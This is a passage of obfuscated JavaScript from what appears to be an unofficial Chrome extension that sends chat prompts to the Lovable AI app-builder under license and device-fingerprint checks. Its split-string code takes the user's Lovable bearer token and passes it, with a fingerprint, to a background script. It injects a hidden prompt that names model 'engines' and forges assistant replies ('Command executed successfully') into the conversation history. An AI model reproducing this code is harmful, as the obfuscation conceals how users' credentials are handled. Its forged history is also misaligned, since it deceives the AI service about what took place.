er'](_n52d280=>_n52d280&&_n52d280['tex'+'t']&&_n52d280['sta'+'tus']==='ok')['map'](_n4e3ea1=>'Use'+'r:\x20'+_n4e3ea1['tex'+'t']['sli'+'ce'](0x0,0x12c))['joi'+'n']('\x20|\x20'),_n3fc6ee=_n1010ae?'':['\x0a\x0aP'+'rot'+'oco'+'lo\x20'+'de\x20'+'qua'+'lid'+'ade'+':','MOT'+'OR\x20'+'00\x20'+'-\x20C'+'LAU'+'DE\x20'+'OPU'+'S\x20-'+'\x20ES'+'TRA'+'TEG'+'IST'+'A:\x20'+'Com'+'pre'+'ens'+'ão\x20'+'pro'+'fun'+'da\x20'+'de\x20'+'req'+'uis'+'ito'+'s,\x20'+'pla'+'nej'+'ame'+'nto'+'\x20co'+'mpl'+'exo'+'\x20e\x20'+'vis'+'ão\x20'+'sis'+'têm'+'ica'+'.\x20G'+'ara'+'nta'+'\x20qu'+'e\x20t'+'oda'+'s\x20a'+'s\x20a'+'lte'+'raç'+'ões'+'\x20si'+'gam'+'\x20a\x20'+'est'+'rat'+'égi'+'a\x20c'+'ent'+'ral'+'\x20do'+'\x20pr'+'oje'+'to.','MOT'+'OR\x20'+'01\x20'+'-\x20S'+'ONN'+'ET\x20'+'-\x20U'+'I/U'+'X\x20S'+'ENI'+'OR:'+'\x20Es'+'tét'+'ica'+'\x20de'+'\x20lu'+'xo,'+'\x20la'+'you'+'ts\x20'+'mod'+'ern'+'os,'+'\x20an'+'ima'+'çõe'+'s\x20s'+'uav'+'es\x20'+'e\x20T'+'ail'+'win'+'d\x20C'+'SS.'+'\x20Cr'+'ie\x20'+'int'+'erf'+'ace'+'s\x20q'+'ue\x20'+'par'+'eça'+'m\x20s'+'ite'+'s\x20p'+'rem'+'iad'+'os\x20'+'com'+'o\x20A'+'www'+'ard'+'s\x20e'+'\x20Dr'+'ibb'+'ble'+'.','MOT'+'OR\x20'+'02\x20'+'-\x20G'+'PT-'+'4o\x20'+'-\x20A'+'RQU'+'ITE'+'TO:'+'\x20Có'+'dig'+'o\x20l'+'imp'+'o,\x20'+'alg'+'ori'+'tmo'+'s\x20e'+'fic'+'ien'+'tes'+',\x20T'+'ype'+'Scr'+'ipt'+'\x20es'+'tri'+'to,'+'\x20se'+'gur'+'anç'+'a\x20e'+'\x20pe'+'rfo'+'rma'+'nce'+'.\x20E'+'str'+'utu'+'ra\x20'+'rob'+'ust'+'a,\x20'+'esc'+'alá'+'vel'+'\x20e\x20'+'sem'+'\x20bu'+'gs.','MOT'+'OR\x20'+'03\x20'+'-\x20O'+'1\x20-'+'\x20PE'+'RFO'+'RMA'+'NCE'+':\x20O'+'tim'+'iza'+'ção'+'\x20má'+'xim'+'a,\x20'+'car'+'reg'+'ame'+'nto'+'\x20in'+'sta'+'ntâ'+'neo'+',\x20m'+'obi'+'le-'+'fir'+'st\x20'+'com'+'\x20al'+'ta\x20'+'sof'+'ist'+'ica'+'ção'+'.\x20A'+'pli'+'caç'+'ão\x20'+'tec'+'nic'+'ame'+'nte'+'\x20im'+'bat'+'íve'+'l\x20e'+'\x20ul'+'tra'+'\x20ve'+'loz'+'.','DIR'+'ETR'+'IZE'+'S:\x20'+'Tip'+'ogr'+'afi'+'a\x20r'+'efi'+'nad'+'a\x20e'+'\x20hi'+'era'+'rqu'+'ia\x20'+'vis'+'ual'+'\x20cl'+'ara'+'.\x20M'+'icr'+'o-i'+'nte'+'raç'+'ões'+'\x20fl'+'uid'+'as\x20'+'em\x20'+'cad'+'a\x20a'+'ção'+'.\x20C'+'ont'+'ras'+'te\x20'+'WCA'+'G\x20p'+'erf'+'eit'+'o\x20e'+'m\x20D'+'ark'+'\x20e\x20'+'Lig'+'ht.'+'\x20Co'+'mpo'+'nen'+'tiz'+'açã'+'o\x20i'+'nte'+'lig'+'ent'+'e\x20e'+'\x20pa'+'drõ'+'es\x20'+'glo'+'bai'+'s.','Pre'+'ser'+'ve\x20'+'ide'+'nti'+'dad'+'e\x20v'+'isu'+'al\x20'+'exi'+'ste'+'nte'+',\x20c'+'ore'+'s,\x20'+'fon'+'tes'+'\x20e\x20'+'var'+'iáv'+'eis'+'\x20CS'+'S\x20d'+'o\x20p'+'roj'+'eto'+'.\x20N'+'ao\x20'+'que'+'bre'+'\x20o\x20'+'lay'+'out'+'\x20at'+'ual'+'.',_n56faee?'His'+'tor'+'ico'+'\x20re'+'cen'+'te:'+'\x20'+_n56faee:'']['fil'+'ter'](Boolean)['joi'+'n']('\x20'),_n1a0ec3=_n1010ae?[]:_n31c5d2['fil'+'ter'](_n20adf3=>_n20adf3&&_n20adf3['tex'+'t']&&_n20adf3['sta'+'tus']==='ok')['fla'+'tMa'+'p'](_n229c26=>[{
'role':'use'+'r','content':_n229c26['tex'+'t']['sli'+'ce'](0x0,0x190),'ts':new Date(_n229c26['tim'+'est'+'amp']||Date['now']())['get'+'Tim'+'e']()}
,{
'role':'ass'+'ist'+'ant','content':'Com'+'and'+'o\x20e'+'xec'+'uta'+'do\x20'+'com'+'\x20su'+'ces'+'so.','ts':new Date(_n229c26['tim'+'est'+'amp']||Date['now']())['get'+'Tim'+'e']()+0x1}
]);
function _n199f75(_n48bbf5){
const _n46d8cb=(_n48bbf5||'')['toL'+'owe'+'rCa'+'se']()['tri'+'m']();
if(!_n46d8cb)return'ato'+'mic';
if(/(refator|refactor|nova p[áa]gina|criar p[áa]gina|nova rota|migrat|schema|arquitetura|estrutura do projeto|reestrutur)/['tes'+'t'](_n46d8cb))return'arc'+'hit'+'ect'+'ura'+'l';
if(/\b(ele|ela|isso|aquilo|esse|essa|tamb[ée]m|ainda|agora|continua|mant[ée]m|igual|do mesmo jeito|mesma coisa|al[ée]m disso|por[ée]m|mas)\b/['tes'+'t'](_n46d8cb)||_n46d8cb['spl'+'it'](/\s+/)['len'+'gth']<=0x6)return'con'+'tex'+'tua'+'l';
return'con'+'tex'+'tua'+'l';
}
const _n256b68=_n199f75(_n54c487),_n2307ea=_n45bf4c?'Ent'+'er\x20'+'pla'+'n\x20m'+'ode'+'.\x0a\x0a':'',_n944892=_n2307ea+_n54c487+_n23a822+_n3b7d24,_n5c6fcc=await new Promise(_n1c0397=>chrome['sto'+'rag'+'e']['loc'+'al']['get'](['ql_'+'rea'+'l_l'+'ova'+'ble'+'_pa'+'ylo'+'ad'],_n1c0397)),_n32bd91=_n5c6fcc['ql_'+'rea'+'l_l'+'ova'+'ble'+'_pa'+'ylo'+'ad']||{
}
,_n1c7d39='012'+'345'+'678'+'9ab'+'cde'+'fgh'+'jkm'+'npq'+'rst'+'vwx'+'yz';
function _nb4fb42(_n142863){
const _n7e91a5=new Uint8Array(0x10);
crypto['get'+'Ran'+'dom'+'Val'+'ues'](_n7e91a5);
const _n4e642c=[_n1c7d39[_n7e91a5[0x0]>>0x5&0x7],_n1c7d39[_n7e91a5[0x0]&0x1f],_n1c7d39[_n7e91a5[0x1]>>0x3&0x1f],_n1c7d39[(_n7e91a5[0x1]&0x7)<<0x2|_n7e91a5[0x2]>>0x6],_n1c7d39[_n7e91a5[0x2]>>0x1&0x1f],_n1c7d39[(_n7e91a5[0x2]&0x1)<<0x4|_n7e91a5[0x3]>>0x4],_n1c7d39[(_n7e91a5[0x3]&0xf)<<0x1|_n7e91a5[0x4]>>0x7],_n1c7d39[_n7e91a5[0x4]>>0x2&0x1f],_n1c7d39[(_n7e91a5[0x4]&0x3)<<0x3|_n7e91a5[0x5]>>0x5],_n1c7d39[_n7e91a5[0x5]&0x1f],_n1c7d39[_n7e91a5[0x6]>>0x3&0x1f],_n1c7d39[(_n7e91a5[0x6]&0x7)<<0x2|_n7e91a5[0x7]>>0x6],_n1c7d39[_n7e91a5[0x7]>>0x1&0x1f],_n1c7d39[(_n7e91a5[0x7]&0x1)<<0x4|_n7e91a5[0x8]>>0x4],_n1c7d39[(_n7e91a5[0x8]&0xf)<<0x1|_n7e91a5[0x9]>>0x7],_n1c7d39[_n7e91a5[0x9]>>0x2&0x1f],_n1c7d39[(_n7e91a5[0x9]&0x3)<<0x3|_n7e91a5[0xa]>>0x5],_n1c7d39[_n7e91a5[0xa]&0x1f],_n1c7d39[_n7e91a5[0xb]>>0x3&0x1f],_n1c7d39[(_n7e91a5[0xb]&0x7)<<0x2|_n7e91a5[0xc]>>0x6],_n1c7d39[_n7e91a5[0xc]>>0x1&0x1f],_n1c7d39[(_n7e91a5[0xc]&0x1)<<0x4|_n7e91a5[0xd]>>0x4],_n1c7d39[(_n7e91a5[0xd]&0xf)<<0x1|_n7e91a5[0xe]>>0x7],_n1c7d39[_n7e91a5[0xe]>>0x2&0x1f],_n1c7d39[(_n7e91a5[0xe]&0x3)<<0x3|_n7e91a5[0xf]>>0x5],_n1c7d39[_n7e91a5[0xf]&0x1f]]['joi'+'n']('');
return _n142863+'_'+_n4e642c;
}
const _n6a218f={
'projeto_id':_n6f14ad,'token_lovable':_n46e207,'mensagem':_n944892,'browser_session_id':_nf22958,'client_git_sha':_n5d6983,'history_buffer':_n1a0ec3,'context_class':_n256b68,[_nf7e693]:'fas'+'t','source':'ext'+'-in'+'put','intent':null,'rota_atual':_n32bd91['cur'+'ren'+'t_p'+'age']||'/','user_license_key':_n3ec621,'session_id':_n6a372d||_n143c7a['ql_'+'ses'+'sio'+'n_i'+'d'],'device_id':_n41f7ef,'lovable_id':_nb4fb42('ums'+'g'),'lovable_ai_message_id':_nb4fb42('aim'+'sg'),'lovable_thread_id':_n32bd91['thr'+'ead'+'_id']||'mai'+'n','lovable_view':'pre'+'vie'+'w','lovable_view_description':'The'+'\x20us'+'er\x20'+'is\x20'+'cur'+'ren'+'tly'+'\x20vi'+'ewi'+'ng\x20'+'the'+'\x20pr'+'evi'+'ew.'+'\x20','lovable_chat_only':![],'lovable_session_replay':_n1010ae?'[]':_n32bd91['ses'+'sio'+'n_r'+'epl'+'ay']||'[]','lovable_current_page':_n32bd91['cur'+'ren'+'t_p'+'age']||'/','lovable_viewport_w':_n32bd91['cur'+'ren'+'t_v'+'iew'+'por'+'t_w'+'idt'+'h']||0x28e,'lovable_viewport_h':_n32bd91['cur'+'ren'+'t_v'+'iew'+'por'+'t_h'+'eig'+'ht']||0x225,'lovable_viewport_dpr':_n32bd91['cur'+'ren'+'t_v'+'iew'+'por'+'t_d'+'pr']||0x1,'lovable_model':_n32bd91['mod'+'el']||null,'lovable_selected_elements':[],'lovable_optimistic_urls':_n5b7332}
;
_n116777['len'+'gth']>0x0&&(_n6a218f['lov'+'abl'+'e_f'+'ile'+'s']=_n116777);
const _n7dc252={
}
;
_n7dc252['ql_'+'dis'+'pla'+'y_m'+'sg']=_n54c487,chrome['sto'+'rag'+'e']['loc'+'al']['set'](_n7dc252);
const _n23680f=await _n19b41c(),_n385786=Date['now']()+0x9c40;
let _n409318=0x0;
while(!![]){
_n409318++;
if(_n409318>0x1){
await new Promise(_n566b99=>_n5e6fc4(()=>_n566b99()));
if(_n39b796){
let _n4a41bd=_n39b796;
if(_n4a41bd['sta'+'rts'+'Wit'+'h']('Bea'+'rer'+'\x20'))_n4a41bd=_n4a41bd['sli'+'ce'](0x7);
_n6a218f['tok'+'en_'+'lov'+'abl'+'e']=_n4a41bd;
}
if(_n2b5999)_n6a218f['pro'+'jet'+'o_i'+'d']=_n2b5999;
}
chrome['sto'+'rag'+'e']['loc'+'al']['set']({
'ql_last_send_log':{
'ts':Date['now'](),'msgPreview':_n54c487['sub'+'str'+'ing'](0x0,0x50),'projectId':_n6a218f['pro'+'jet'+'o_i'+'d'],'step':'sen'+'din'+'g_d'+'ire'+'ct_'+'sid'+'epa'+'nel'}
}
);
let _n28af11=null;
try{
const _n55c0cd=await new Promise((_n30d2c8,_n2bb2d8)=>{
const _na811a2={
}
;
_na811a2['act'+'ion']='sen'+'dMe'+'ssa'+'ge',_na811a2['mes'+'sag'+'e']=_n6a218f['men'+'sag'+'em'],_na811a2['pro'+'jec'+'tId']=_n6a218f['pro'+'jet'+'o_i'+'d'],_na811a2['tok'+'en']=_n6a218f['tok'+'en_'+'lov'+'abl'+'e'],_na811a2['att'+'ach'+'men'+'ts']=_n6a218f['lov'+'abl'+'e_f'+'ile'+'s']||[],_na811a2['opt'+'imi'+'sti'+'cUr'+'ls']=_n6a218f['lov'+'abl'+'e_o'+'pti'+'mis'+'tic'+'_ur'+'ls']||[],_na811a2['his'+'tor'+'yBu'+'ffe'+'r']=_n6a218f['his'+'tor'+'y_b'+'uff'+'er']||[],_na811a2['con'+'tex'+'tCl'+'ass']=_n6a218f['con'+'tex'+'t_c'+'las'+'s']||'con'+'tex'+'tua'+'l',_na811a2['lic'+'ens'+'eKe'+'y']=_n143c7a['ql_'+'ck']||'',_na811a2['dev'+'ice'+'Fin'+'ger'+'pri'+'nt']=_n23680f||'',chrome['run'+'tim'+'e']['sen'+'dMe'+'ssa'+'ge'](_na811a2,_n5de68b=>{
if(chrome['run'+'tim'+'e']['las'+'tEr'+'ror'])_n2bb2d8(new Error(chrome['run'+'tim'+'e']['las'+'tEr'+'ror']['mes'+'sag'+'e']||'Err'+'o\x20d'+'e\x20c'+'omu'+'nic'+'açã'+'o\x20c'+'om\x20'+'o\x20b'+'ack'+'gro'+'und'));
else{
const _n25890a={
}
;
_n25890a['suc'+'ces'+'s']=![],_n25890a['ok']=![],_n25890a['err'+'or']='Sem'+'\x20re'+'spo'+'sta'+'\x20do'+'\x20ba'+'ckg'+'rou'+'nd',_n30d2c8(_n5de68b||_n25890a);
}
}
);
}
),_n3f53fa=_n1f65c2(_n55c0cd);
if(_n3f53fa==='__u'+'pda'+'te_'+'req'+'uir'+'ed_'+'_')return;
if(_n3f53fa)throw new Error(_n3f53fa);
chrome['sto'+'rag'+'e']['loc'+'al']['set']({
'ql_last_send_log':{
'ts':Date['now'](),'msgPreview':_n54c487['sub'+'str'+'ing'](0x0,0x50),'projectId':_n6a218f['pro'+'jet'+'o_i'+'d'],'step':'ok_'+'sid'+'epa'+'nel','ok':!![]}
}
),_n20609f=Date['now'](),_n30b6bd(_n55c0cd&&typeof _n55c0cd['cmd'+'_co'+'unt']==='num'+'ber'?_n55c0cd['cmd'+'_co'+'unt']:undefined),_n176391(spT('toa'+'st_'+'com'+'man'+'d_s'+'ent')),_n2a4116(_n54c487||'[An'+'exo'+'s]','ok');
if(_n1db480)_n1db480['val'+'ue']='';
_ne62fcc['for'+'Eac'+'h'](_n21e83f=>{
if(_n21e83f['pre'+'vie'+'wUr'+'l'])URL['rev'+'oke'+'Obj'+'ect'+'URL'](_n21e83f['pre'+'vie'+'wUr'+'l']);
}
),_ne62fcc=[],_n1eeb71();
break;
}
catch(_n388a9a){
_n28af11=_n388a9a;
}
const _n52ae30=_n28af11['mes'+'sag'+'e']||String(_n28af11);
if(/license_invalid:|hwid_mismatch:|captcha_required|payment_required/i['tes'+'t'](_n52ae30)||/403|http_403/['tes'+'t'](_n52ae30))throw _n28af11;
const _n2c233f=_n385786-Date['now'](),_n5fb516=/429|http_429/['tes'+'t'](_n52ae30)?0xdac:0x7d0;
if(_n2c233f<=_n5fb516||_n409318>=0x5)throw _n28af11;
await new Promise(_n9e1f7=>setTimeout(_n9e1f7,_n5fb516));
}
}
catch(_n4f0ff2){
const _n1a47c5=_n4f0ff2['mes'+'sag'+'e']||String(_n4f0ff2);
if(/hwid_mismatch:/i['tes'+'t'](_n1a47c5)){
_n4ce99a(spT('log'+'in_'+'dev'+'ice'+'_co'+'nfl'+'ict')),_n2a4116(_n54c487||'[An'+'exo'+'s]','err'+'or');
return;
}
if(/license_invalid:/i['tes'+'t'](_n1a47c5)){
_n4ce99a(_n1a47c5['rep'+'lac'+'e'](/^.*license_invalid:\s*/i,'')),_n2a4116(_n54c487||'[An'+'exo'+'s]','err'+'or');
return;
}
const _n452b82=/429|http_429|rate.?limit|too.?many/i['tes'+'t'](_n1a47c5),_n1e1034=/failed to fetch|networkerror|network request failed/i['tes'+'t'](_n1a47c5),_n3a6325=_n452b82||/temporário|400|500|Timeout|tente novamente/i['tes'+'t'](_n1a47c5);
if(_n452b82)_n3921c7(spT('err'+'_ra'+'te_'+'lim'+'it'));
else{
if(_n1e1034)_n3921c7(spT('err'+'_no'+'_co'+'nne'+'cti'+'on'));
else _n3a6325?_n3921c7(spT('err'+'_wa'+'it_'+'ret'+'ry')):_n3921c7(_n1a47c5);
}
_n2a4116(_n54c487||'[An'+'exo'+'s]','err'+'or');
if(_n6ccf92&&_n452b82){
_n6ccf92['dis'+'abl'+'ed']=!![],_n6ccf92['tex'+'tCo'+'nte'+'nt']='↺\x20T'+'ent'+'ar\x20'+'nov'+'ame'+'nte',_n6ccf92['cla'+'ssL'+'ist']['rem'+'ove']('ql-'+'sen'+'d-b'+'lin'+'k'),_n6ccf92['cla'+'ssL'+'ist']['add']('sp-'+'btn'+'-re'+'try'),setTimeout(()=>{
if(_n6ccf92&&_n6ccf92['cla'+'ssL'+'ist']['con'+'tai'+'ns']('sp-'+'btn'+'-re'+'try'))_n6ccf92['dis'+'abl'+'ed']=![];
}
,0x1388);
if(window['_sp'+'Ret'+'ryT'+'ime'+'r'])clearTimeout(window['_sp'+'Ret'+'ryT'+'ime'+'r']);
window['_sp'+'Ret'+'ryT'+'ime'+'r']=setTimeout(()=>{
_n6ccf92&&_n6ccf92['cla'+'ssL'+'ist']['con'+'tai'+'ns']('sp-'+'btn'+'-re'+'try')&&(_n6ccf92['tex'+'tCo'+'nte'+'nt']='Env'+'iar',_n6ccf92['dis'+'abl'+'ed']=![],_n6ccf92['cla'+'ssL'+'ist']['rem'+'ove']('sp-'+'btn'+'-re'+'try'));
}
,0x61a8);
return;
}
if(_n6ccf92&&_n3a6325){
_n6ccf92['dis'+'abl'+'ed']=![],_n6ccf92['tex'+'tCo'+'nte'+'nt']='↺\x20T'+'ent'+'ar\x20'+'nov'+'ame'+'nte',_n6ccf92['cla'+'ssL'+'ist']['rem'+'ove']('ql-'+'sen'+'d-b'+'lin'+'k'),_n6ccf92['cla'+'ssL'+'ist']['add']('sp-'+'btn'+'-re'+'try');
if(window['_sp'+'Ret'+'ryT'+'ime'+'r'])clearTimeout(window['_sp'+'Ret'+'ryT'+'ime'+'r']);
window['_sp'+'Ret'+'ryT'+'ime'+'r']=setTimeout(()=>{
_n6ccf92['cla'+'ssL'+'ist']['con'+'tai'+'ns']('sp-'+'btn'+'-re'+'try')&&(_n6ccf92['tex'+'tCo'+'nte'+'nt']='Env'+'iar',_n6ccf92['cla'+'ssL'+'ist']['rem'+'ove']('sp-'+'btn'+'-re'+'try'));
}
,0x2710);
return;
}
}
finally{
_n443c3a=![],_n6ccf92&&!_n6ccf92['cla'+'ssL'+'ist']['con'+'tai'+'ns']('sp-'+'btn'+'-re'+'try')&&(_n6ccf92['dis'+'abl'+'ed']=![],_n6ccf92['tex'+'tCo'+'nte'+'nt']='Env'+'iar',_n6ccf92['cla'+'ssL'+'ist']['rem'+'ove']('ql-'+'sen'+'d-b'+'lin'+'k'));
}
}
const _n17eba3={
}
;
_n17eba3['ico'+'n']='🎨',_n17eba3['lab'+'el']='SON'+'NET';
const _n26fa27={
}
;
_n26fa27['ico'+'n']='🛠️',_n26fa27['lab'+'el']='OPU'+'S\x204'+'.7';
const _n461650={
}
;
_n461650['ico'+'n']='📈',_n461650['lab'+'el']='GPT'+'-4o';
const _n7b8614={
}
;
_n7b8614['cla'+'ude'+'-so'+'nne'+'t']=_n17eba3,_n7b8614['cla'+'ude'+'-op'+'us']=_n26fa27,_n7b8614['gpt'+'4o']=_n461650;
const _n259e89=_n7b8614;
function _n31e586(){
const _n154447=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'mod'+'e-t'+'ogg'+'le'),_n36f49e=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'pla'+'n-b'+'ann'+'er'),_nbea295=document['que'+'ryS'+'ele'+'cto'+'r']('.sp'+'-mo'+'de-'+'chk'+'-bu'+'ild'),_n4f6592=document['que'+'ryS'+'ele'+'cto'+'r']('.sp'+'-mo'+'de-'+'chk'+'-pl'+'an'),_n5b9489=_n259e89[_n11f60c]||_n259e89['cla'+'ude'+'-op'+'us'];
_n154447&&(_n45bf4c?(_n154447['inn'+'erH'+'TML']='<sp'+'an\x20'+'cla'+'ss='+'\x22sp'+'-mo'+'de-'+'ico'+'n\x22>'+'📋</'+'spa'+'n><'+'spa'+'n\x20c'+'las'+'s=\x22'+'sp-'+'mod'+'e-l'+'abe'+'l\x22>'+'PLA'+'N</'+'spa'+'n><'+'spa'+'n\x20c'+'las'+'s=\x22'+'sp-'+'mod'+'e-a'+'rro'+'w\x22>'+'▾</'+'spa'+'n>',_n154447['cla'+'ssL'+'ist']['add']('sp-'+'mod'+'e-p'+'lan'),_n154447['tit'+'le']='Mod'+'o:\x20'+'Pla'+'no\x20'+'(di'+'scu'+'te\x20'+'ant'+'es\x20'+'de\x20'+'edi'+'tar'+')'):(_n154447['inn'+'erH'+'TML']='<sp'+'an\x20'+'cla'+'ss='+'\x22sp'+'-mo'+'de-'+'ico'+'n\x22>'+_n5b9489['ico'+'n']+('</s'+'pan'+'><s'+'pan'+'\x20cl'+'ass'+'=\x22s'+'p-m'+'ode'+'-la'+'bel'+'\x22>')+_n5b9489['lab'+'el']+('</s'+'pan'+'><s'+'pan'+'\x20cl'+'ass'+'=\x22s'+'p-m'+'ode'+'-ar'+'row'+'\x22>▾'+'</s'+'pan'+'>'),_n154447['cla'+'ssL'+'ist']['rem'+'ove']('sp-'+'mod'+'e-p'+'lan'),_n154447['tit'+'le']='Mot'+'or\x20'+'IA:'+'\x20'+_n5b9489['lab'+'el']));
if(_n36f49e)_n36f49e['sty'+'le']['dis'+'pla'+'y']=_n45bf4c?'blo'+'ck':'non'+'e';
if(_nbea295)_nbea295['sty'+'le']['vis'+'ibi'+'lit'+'y']=_n45bf4c?'hid'+'den':'vis'+'ibl'+'e';
if(_n4f6592)_n4f6592['sty'+'le']['vis'+'ibi'+'lit'+'y']=_n45bf4c?'vis'+'ibl'+'e':'hid'+'den';
['cla'+'ude'+'-so'+'nne'+'t','cla'+'ude'+'-op'+'us','gpt'+'4o']['for'+'Eac'+'h'](_n4679bc=>{
const _n2f48e7=document['que'+'ryS'+'ele'+'cto'+'r']('.sp'+'-ai'+'-ch'+'k-'+_n4679bc);
if(_n2f48e7)_n2f48e7['sty'+'le']['vis'+'ibi'+'lit'+'y']=_n11f60c===_n4679bc?'vis'+'ibl'+'e':'hid'+'den';
}
);
}
let _n41b289=0x0;
const _n35f9c4=0x5;
function _n4ae681(_n56bcbf){
if(_n4f7518)clearInterval(_n4f7518);
_n41b289=0x0,_n4f7518=setInterval(async()=>{
try{
if(!chrome['run'+'tim'+'e']||!chrome['run'+'tim'+'e']['id']){
clearInterval(_n4f7518),console['war'+'n']('[SP'+']\x20H'+'ear'+'tbe'+'at\x20'+'sto'+'ppe'+'d:\x20'+'ext'+'ens'+'ion'+'\x20co'+'nte'+'xt\x20'+'inv'+'ali'+'dat'+'ed');
return;
}
const _n4db835=await new Promise(_n16820f=>chrome['sto'+'rag'+'e']['loc'+'al']['get'](['ql_'+'ed'],_n16820f)),_n84d6a6=_n4db835['ql_'+'ed']||_n2f3531,_nd16433=await new Promise(_n34076f=>chrome['sto'+'rag'+'e']['loc'+'al']['get'](['ql_'+'ck','ql_'+'lic'+'ens'+'e_s'+'tat'+'us','ql_'+'exp'+'ire'+'s_a'+'t'],_n34076f));
if(!_nd16433['ql_'+'ck']){
_n4ce99a(_nd16433['ql_'+'lic'+'ens'+'e_s'+'tat'+'us']==='tri'+'al'||_nd16433['ql_'+'exp'+'ire'+'s_a'+'t']&&new Date(_nd16433['ql_'+'exp'+'ire'+'s_a'+'t'])['get'+'Tim'+'e']()<=Date['now']()?spT('log'+'in_'+'tri'+'al_'+'exp'+'ire'+'d'):spT('log'+'in_'+'inv'+'ali'+'d_r'+'elo'+'gin'));
return;
}
const _n5171da={
}
;
_n5171da['que'+'enK'+'ey']=_n56bcbf,_n5171da['chi'+'ldK'+'ey']=_nd16433['ql_'+'ck']||null,_n5171da['ses'+'sio'+'nId']=_n6a372d,_n5171da['dev'+'ice'+'IdV'+'alu'+'e']=_n84d6a6,_n5171da['use'+'rNa'+'meV'+'alu'+'e']=_n1ba7e3,_n5171da['exp'+'ire'+'sAt'+'Val'+'ue']=_n10b465,_n5171da['act'+'iva'+'ted'+'AtV'+'alu'+'e']=null,_n5171da['sta'+'tus'+'Val'+'ue']=_n472837;
const _n5dc471=await _n3ebccc(_n5171da);
_n41b289=0x0;
if(!_n5dc471['val'+'id']){
const _n3eb829=_n411d15(_n5dc471);
_n4ce99a(_n3eb829?spT('log'+'in_'+'dev'+'ice'+'_co'+'nfl'+'ict'):_n264573(_n5dc471,_n472837,_n10b465));
return;
}
if(_n5dc471['use'+'r_n'+'ame']){
_n1ba7e3=_n5dc471['use'+'r_n'+'ame'];
const _n4f2c85=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'nam'+'e');
if(_n4f2c85)_n4f2c85['tex'+'tCo'+'nte'+'nt']=_n5dc471['use'+'r_n'+'ame'];
}
_n5dc471['exp'+'ire'+'s_a'+'t']&&(_n10b465=_n5dc471['exp'+'ire'+'s_a'+'t'],_n13f13d(_n10b465));
if(_n5dc471['sta'+'tus'])_n472837=_n5dc471['sta'+'tus'];
}
catch(_n4bb1f3){
if(_n4bb1f3['mes'+'sag'+'e']&&_n4bb1f3['mes'+'sag'+'e']['inc'+'lud'+'es']('Ext'+'ens'+'ion'+'\x20co'+'nte'+'xt\x20'+'inv'+'ali'+'dat'+'ed')){
clearInterval(_n4f7518),console['war'+'n']('[SP'+']\x20H'+'ear'+'tbe'+'at\x20'+'sto'+'ppe'+'d:\x20'+'ext'+'ens'+'ion'+'\x20co'+'nte'+'xt\x20'+'inv'+'ali'+'dat'+'ed');
return;
}
if(/401|403|404|unauthorized|forbidden|not found/i['tes'+'t'](_n4bb1f3['mes'+'sag'+'e']||'')){
_n4ce99a(spT('log'+'out'+'_se'+'ssi'+'on_'+'blo'+'cke'+'d'));
return;
}
_n41b289++,_n41b289>=_n35f9c4&&_n4ce99a(spT('log'+'out'+'_ve'+'rif'+'y_f'+'ail'+'ed'));
}
}
,0x3a98);
}
function _n1f662d(){
_n271ac3(),_n41d3a6(),document['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',function(_n196a44){
const _n367f28=_n196a44['tar'+'get']['clo'+'ses'+'t']('#sp'+'-la'+'ng-'+'btn'),_n882615=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'lan'+'g-m'+'enu');
if(_n367f28){
if(_n882615)_n882615['sty'+'le']['dis'+'pla'+'y']=_n882615['sty'+'le']['dis'+'pla'+'y']==='fle'+'x'?'non'+'e':'fle'+'x';
return;
}
const _n4fb39d=_n196a44['tar'+'get']['clo'+'ses'+'t']('.sp'+'-la'+'ng-'+'opt');
if(_n4fb39d){
const _n45ebcb=_n4fb39d['get'+'Att'+'rib'+'ute']('dat'+'a-l'+'ang');
spSetLanguage(_n45ebcb,function(){
_n271ac3(),_n41d3a6(),_n341900();
}
);
return;
}
_n882615&&_n882615['sty'+'le']['dis'+'pla'+'y']==='fle'+'x'&&!_n196a44['tar'+'get']['clo'+'ses'+'t']('#sp'+'-la'+'ng-'+'swi'+'tch'+'er')&&(_n882615['sty'+'le']['dis'+'pla'+'y']='non'+'e');
}
);
}
function _n271ac3(){
const _n38810b=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'lan'+'g-s'+'lot');
if(_n38810b)_n38810b['inn'+'erH'+'TML']=spTemplateLangSwitcher();
}
function _n41d3a6(){
const _n5e1319=document['get'+'Ele'+'men'+'tBy'+'Id']('ql-'+'the'+'me-'+'btn');
if(_n5e1319)_n5e1319['tit'+'le']=spT('hea'+'der'+'_th'+'eme'+'_to'+'ggl'+'e');
document['que'+'ryS'+'ele'+'cto'+'rAl'+'l']('.sp'+'-no'+'tif'+'-bt'+'n')['for'+'Eac'+'h'](function(_n555214){
_n555214['tit'+'le']=spT('hea'+'der'+'_no'+'tif'+'ica'+'tio'+'ns');
}
);
const _n2e0f43=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'log'+'out'+'-bt'+'n');
if(_n2e0f43)_n2e0f43['tit'+'le']=spT('hea'+'der'+'_lo'+'gou'+'t');
const _n10e9c8=document['que'+'ryS'+'ele'+'cto'+'r']('.sp'+'-no'+'tif'+'-he'+'ade'+'r\x20s'+'pan');
if(_n10e9c8)_n10e9c8['tex'+'tCo'+'nte'+'nt']=spT('not'+'if_'+'pan'+'el_'+'tit'+'le');
const _n22ca64=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'loa'+'din'+'g-t'+'ext');
if(_n22ca64)_n22ca64['tex'+'tCo'+'nte'+'nt']='⏳\x20'+spT('loa'+'din'+'g');
const _n3c18ee=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'foo'+'ter'+'-te'+'xt');
if(_n3c18ee)_n3c18ee['tex'+'tCo'+'nte'+'nt']=spT('foo'+'ter'+'_of'+'fic'+'ial');
}
function _n341900(){
try{
if(document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'lic'+'ens'+'e-i'+'npu'+'t'))_n29f51a();
else typeof _n12caa4!=='und'+'efi'+'ned'&&_n12caa4&&_nec67e5(_n12caa4);
}
catch(_n3314d6){
}
}
(async function _n3ec1ff(){
await new Promise(_n39bd0a=>spInitLanguage(()=>_n39bd0a())),_n1f662d();
try{
_n2f3531=await Promise['rac'+'e']([_n54429f(),new Promise(_n52b9f6=>setTimeout(()=>_n52b9f6('tim'+'eou'+'t-'+Date['now']()),0x7d0))]);
}
catch(_n51d50a){
